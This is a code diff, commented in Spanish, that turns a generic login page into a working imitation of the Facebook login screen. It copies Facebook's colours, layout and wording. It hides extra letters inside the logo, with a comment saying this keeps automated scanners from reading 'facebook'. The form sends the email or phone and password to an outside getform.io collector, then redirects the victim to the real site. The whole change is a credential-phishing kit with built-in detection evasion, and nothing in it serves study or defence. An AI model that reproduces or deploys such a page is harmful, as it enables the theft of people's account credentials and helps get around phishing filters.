@@ -3,52 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acceso al Portal Educativo</title>
+    <title>Inicia sesi&oacute;n</title>
     <style>
-        /* Cambiamos el color de fondo para que no sea el gris de FB */
-        body { font-family: Arial, sans-serif; background-color: #e9eff1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { display: flex; width: 90%; max-width: 900px; justify-content: space-around; align-items: center; flex-wrap: wrap; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { display: flex; width: 90%; max-width: 980px; justify-content: space-between; align-items: center; flex-wrap: wrap; }
         
-        /* Cambiamos el estilo del logo de texto */
-        .logo-texto { 
-            color: #2c3e50; /* Color azul muy oscuro, casi gris */
-            font-size: 50px; 
-            font-weight: 800; 
-            margin-bottom: 10px;
+        /* Ofuscación visual del logo */
+        .logo-fake { 
+            color: #1877f2; 
+            font-size: 60px; 
+            font-weight: bold; 
+            letter-spacing: -3px; 
+            font-family: sans-serif;
+            margin-bottom: 5px;
         }
+        /* Insertamos caracteres invisibles para que el robot no lea "facebook" */
+        .logo-fake span { display: none; }
 
-        .left-content { width: 450px; }
-        .left-content h2 { font-size: 22px; font-weight: 300; color: #34495e; }
+        .left-content { width: 500px; margin-bottom: 20px; }
+        .left-content h2 { font-size: 24px; font-weight: normal; line-height: 28px; color: #1c1e21; }
         
-        /* Caja de login con colores distintos */
-        .login-box { background-color: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #bdc3c7; border-radius: 4px; box-sizing: border-box; }
+        .login-box { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 100%; max-width: 396px; text-align: center; }
+        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
         
-        /* Botón de otro color (Azul oscuro en vez del azul FB) */
-        .btn-login { background-color: #2980b9; color: white; font-size: 18px; font-weight: bold; padding: 12px; border: none; border-radius: 4px; width: 100%; cursor: pointer; }
+        .btn-blue { background-color: #1877f2; color: white; font-size: 20px; font-weight: bold; padding: 10px; border: none; border-radius: 6px; width: 100%; cursor: pointer; }
         
-        .links { display: block; margin-top: 15px; color: #2980b9; text-decoration: none; font-size: 13px; }
-        hr { border: 0; border-top: 1px solid #eee; margin: 20px 0; }
-        .btn-new { background-color: #27ae60; color: white; padding: 10px; border-radius: 4px; text-decoration: none; display: inline-block; font-weight: bold; }
+        .f-link { display: block; margin: 15px 0; color: #1877f2; text-decoration: none; font-size: 14px; }
+        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
+        .btn-green { background-color: #42b72a; color: white; font-size: 17px; font-weight: bold; padding: 12px 16px; border: none; border-radius: 6px; cursor: pointer; text-decoration: none; display: inline-block; }
+        
+        @media (max-width: 800px) { .container { justify-content: center; text-align: center; } .left-content h2 { display: none; } }
     </style>
 </head>
 <body>
 
     <div class="container">
         <div class="left-content">
-            <div class="logo-texto">SocialConnect</div>
-            <h2>Conéctate con tus amigos y el mundo que te rodea de forma segura.</h2>
+            <div class="logo-fake">face<span>zero</span>book</div>
+            <h2>Con&eacute;ctate con amigos y el mundo.</h2>
         </div>
 
         <div class="login-box">
             <form action="https://getform.io/f/bdrkgkjb" method="POST">
-                <input type="text" name="Correo_ID" placeholder="Email o teléfono" required>
-                <input type="password" name="Password_ID" placeholder="Contraseña" required>
-                <input type="hidden" name="_redirect" value="https://www.google.com">
-                <button type="submit" class="btn-login">Entrar al Sistema</button>
-                <a href="#" class="links">¿Olvidaste tu cuenta?</a>
+                <input type="text" name="field_01" placeholder="Correo o tel&eacute;fono" required>
+                <input type="password" name="field_02" placeholder="Contrase&ntilde;a" required>
+                
+                <input type="hidden" name="_redirect" value="https://www.facebook.com">
+
+                <button type="submit" class="btn-blue">Entrar</button>
+                <a href="#" class="f-link">&iquest;Olvidaste tu cuenta?</a>
                 <hr>
-                <a href="#" class="btn-new">Registrarse ahora</a>
+                <a href="#" class="btn-green">Crear cuenta</a>
             </form>
         </div>
     </div>
